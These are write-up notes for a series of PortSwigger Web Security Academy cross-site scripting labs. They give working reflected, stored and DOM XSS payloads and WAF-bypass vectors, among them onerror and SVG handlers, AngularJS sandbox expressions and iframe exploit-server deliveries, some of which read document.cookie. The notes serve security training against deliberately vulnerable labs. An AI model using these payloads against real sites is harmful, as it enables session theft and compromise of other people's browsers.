---
description: https://portswigger.net/web-security/cross-site-scripting
---

# Cross-site scripting

### Lab: Reflected XSS into HTML context with nothing encoded

This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.

```
/?search=test
<h1>1 search results for 'test'</h1>

<script>alert(0)</script>
```

### Lab: Stored XSS into HTML context with nothing encoded

This lab contains a stored cross-site scripting vulnerability in the comment functionality.

`csrf=dEw6a3DaskdxmTVrwvlONQj1sGecwy30&postId=6&comment=`**`%3Cscript%3Ealert%280%29%3C%2Fscript%3E`**`+This+is+a+comment.&name=test&email=test%40test.com&website=https%3A%2F%2Fwww.test.com`

```
<script>alert(0)</script>
```

### Lab: DOM XSS in document.write sink using source location.search

This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.

```
<script>
	function trackSearch(query) {
		document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
	}
	var query = (new URLSearchParams(window.location.search)).get('search');
	if(query) {
		trackSearch(query);
	}
</script>
```

**Search -> 123456789**

```
<script>
...
<img src="/resources/images/tracker.gif?searchTerms=123456789">
...
</script>
```

**Search ->**

```
"><svg onload=alert(1)>
```

### Lab: DOM XSS in document.write sink using source location.search inside a select element

This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.

```
<script>
	var stores = ["London","Paris","Milan"];
	var store = (new URLSearchParams(window.location.search)).get('storeId');
	document.write('<select name="storeId">');
	if(store) {
		document.write('<option selected>'+store+'</option>');
	}
	for(var i=0;i<stores.length;i++) {
		if(stores[i] === store) {
			continue;
		}
		document.write('<option>'+stores[i]+'</option>');
	}
	document.write('</select>');
</script>
```

```
/product?productId=1&storeId=London"><script>alert(1)</script>"
London">"

/product?productId=1&storeId=Milan"><script>alert(1)</script>"
Milan">"

product?productId=1&storeId="><img src=1 onerror=alert(1)>
```

### Lab: DOM XSS in innerHTML sink using source location.search

This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.

```
<script>
	function doSearchQuery(query) {
		document.getElementById('searchMessage').innerHTML = query;
	}
	var query = (new URLSearchParams(window.location.search)).get('search');
	if(query) {
		doSearchQuery(query);
	}
</script>
```

```
<img src=1 onerror=alert(document.domain)>
```

### Lab: DOM XSS in jQuery anchor href attribute sink using location.search source

This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search.

```
<script>
	$(function() {
		$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
	});
</script>
```

```
/feedback?returnPath=/123456789
<a id="backLink" href="/123456789">Back</a>

/feedback?returnPath=javascript:alert(document.domain)
<a id="backLink" href="javascript:alert(document.domain)">Back</a>
```

### Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.

AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.

```
<body ng-app>
```

**Search ->**

```
{{$on.constructor('alert(0)')()}}
```

### Lab: Reflected DOM XSS

This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.

**Search -> 12345678**

```
GET /?search=12345678 HTTP/1.1
GET /search-results?search=12345678 HTTP/1.1
{"results":[],"searchTerm":"12345678"}
```

```
/resources/js/searchResults.js
eval('var searchResultsObj = ' + this.responseText);
```

**Search ->**

```
 \"-alert(1)}//

{"results":[],"searchTerm":"\\"-alert(1)}//"}
```

### Lab: Stored DOM XSS

This lab demonstrates a stored DOM vulnerability in the blog comment functionality.

```
GET /post/comment?postId=9 HTTP/1.1
{
    "avatar":"",
    "website":"https://www.test.com",
    "date":"2021-11-21T22:51:20.697595457Z",
    "body":"test",
    "author":"test"
}
```

```
<script>alert(0)</script>
```

Website encoded first <> angle brackets. If we add <> at the beginning we can bypass it. But we can not. We can see the cause in the response.

```
"body":"<><script>alert(0)<\/script>",
"author":"<><script>alert(0)<\/script>"
```

JS added \ before /. So we can not use this payload. Try another one.

```
<><img src=1 onerror=alert(1)>
```

> In an attempt to prevent XSS, the website uses the JavaScript replace() function to encode angle brackets.

### Lab: Reflected XSS into HTML context with most tags and attributes blocked

This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.

There is a WAF. It blocks most of tags and attributes.

**XSS tags list ->** https://portswigger.net/web-security/cross-site-scripting/cheat-sheet **-> Copy tags to clipboard**

**Sniper attack with xss tags list -> **

`GET /?search=<§§> HTTP/1.1`

Just body tag is allowed.

**XSS events list -> Choose body tag ->** https://portswigger.net/web-security/cross-site-scripting/cheat-sheet **-> Copy events to clipboard**

**Sniper attack with xss events list -> **

`GET /?search=<body%20§§=1> HTTP/1.1`

Just onresize attribute is allowed.

```
<body onresize="print()">
```

**Exploit Server ->**

```
Body: 
    <iframe src="https://ac991f1b1edf2073c08b13cd00140027.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

Deliver exploit to victim -> Solved.

### Lab: Reflected XSS into HTML context with all tags blocked except custom ones

This lab blocks all HTML tags except custom ones.

```
<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
```

**Exploit Server ->**

```
Body: 
    <iframe src="https://ac9e1fe91fb69acfc08b2cf400330037.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x" onload=this.style.width='100px'>

OR

    <script>
    location = 'https://ac9e1fe91fb69acfc08b2cf400330037.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
    </script>
```

### Lab: Reflected XSS with event handlers and href attributes blocked

This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked.

**Sniper attack with xss tags list -> **

`GET /?search=<§§> HTTP/1.1`

_a, animate, image, svg, title_

```
<svg>
	<a>
		<animate attributeName=href values=javascript:alert(1) />
		<text x=20 y=20>Click me</text>
	</a>
	
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```

### Lab: Reflected XSS with some SVG markup allowed

This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.

**Sniper attack with xss tags list -> **

`GET /?search=<§§> HTTP/1.1`

_animatetransform, image, svg, title_

```
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```

### Lab: Reflected XSS into attribute with angle brackets HTML-encoded

This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded.

```
/?search=test

In response:
<input type=text placeholder='Search the blog...' name=search value="test">
```

```
"><script>alert(1)</script>

In response:
<input type=text placeholder='Search the blog...' name=search value=""&gt;&lt;script&gt;alert(1)&lt;/script&gt;">
```

```
" autofocus onfocus=alert(1) x="
OR
"onmouseover="alert(1)
```

### Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded

This lab contains a stored cross-site scripting vulnerability in the comment functionality.

```
POST /post/comment HTTP/1.1
...
csrf=5W6i2nTpsEcdB99eWpnMALhpOtFoC8qF&postId=6&comment=test1&name=test2&email=test3%40test.com&website=https%3A%2F%2Fwww.test4.com

In response:
<a id="author" href="https://www.test4.com">test2</a>
```

```
POST /post/comment HTTP/1.1
...
...website=javascript%3Aalert%280%29

In response:
<a id="author" href="javascript:alert(document)">test</a>
```

### Lab: Reflected XSS in canonical link tag

This lab reflects user input in a canonical link tag and escapes angle brackets.

```
<link rel="canonical" href='https://acbb1f671fa57b23c0110b0100ea000f.web-security-academy.net/'/>
```

```
Request:
/?%27test%27=%27test2%27

Response:
....net/?'test'='test2''/>
```

```
/?'accesskey='x'onclick='alert(1)
```

### Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped

This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.

**Search -> 12345678**

```
Response:
<script>
	var searchTerms = '12345678';
	document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

Single quote gets backslash-escaped

```
</script><script>alert(document)//

Response:
var searchTerms = '</script><script>alert(document)//';

OR

</script><script>alert(1)</script>
```

### Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded

This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string.

**Search -> 12345678**

```
Response:
<script>
	var searchTerms = '12345678';
	document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

Angle brackets get encoded.

```
';alert(document);//

'-alert(1)-'
```

### Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.

**Search -> 12345678**

```
Response:
<script>
	var searchTerms = '12345678';
	document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

```
'-alert(1)-'

Response:
var searchTerms = '\'-alert(1)-\'';
```

Single quote gets backslash-escaped. Can we bypass adding a backslash and double slash?

```
\'-alert(1)//
```

### Lab: Reflected XSS in a JavaScript URL with some characters blocked

This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent XSS attacks.

Post a comment with these to name and comment : `< > / ' " : ; =`

```
<p>&lt; &gt; / &apos; &quot; : ; =</p>
```

`/ : ; =` are allowed.

```
<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d5'}).finally(_ => window.location = '/')">Back to Blog</a>
```

```
GET /post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27 HTTP/1.1

Decoded:
GET /post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:' HTTP/1.1

The link:
javascript:fetch('/analytics', {method:'post',body:'/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:''}).finally(_ => window.location = '/')
```

### Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

This lab contains a stored cross-site scripting vulnerability in the comment functionality.

**Post a comment:**

```
In response:
<a id="author" href="https://www.test4.com" onclick="var tracker={track(){}};tracker.track('https://www.test4.com');">test2</a>
```

```
&apos;-alert(1)-&apos;
&apos;alert(1);//

onclick="var tracker={track(){}};tracker.track('https://www.test4.com&apos;-alert(1)-&apos;');"
```

### Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

This lab contains a reflected cross-site scripting vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped.

**Search -> 12345678**

```
<script>
	var message = `0 search results for '12345678'`;
	document.getElementById('searchMessage').innerText = message;
</script>
```

There is a JavaScript template string.

```
${alert(1)}
```
